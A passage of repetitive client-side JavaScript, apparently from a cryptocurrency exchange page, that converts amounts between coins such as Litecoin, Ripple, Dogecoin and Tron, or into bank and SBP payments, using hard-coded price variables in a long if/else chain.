                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_LTC ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_BCH ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_BCH ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_XRP ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XRP ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_DOGE ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_DOGE ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_ETC ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_ETC ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_XLM ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteFirstName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_SOL ).toFixed(6);
                    } else if ( valuteFirstName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' || valuteFirstName == 'Ethereum (ETH)' || valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_ARB ).toFixed(3);
                    } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_LTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_BCH  ).toFixed(2);
                    } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-one').value = document.querySelector('.first__input-two').value;
                    } else if ( valuteFirstName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteFirstName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteFirstName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_XLM ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteSecondName == 'Tron (TRX)' ) {
                    if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * data.Valute.USD.Value ) * PRICE_TRX ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-one').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-one').value);
                            document.querySelector('.first__input-one').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__input-one').value = ( ( document.querySelector('.first__input-two').value * PRICE_TRX ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteFirstName == 'Dai (DAI)' ) {
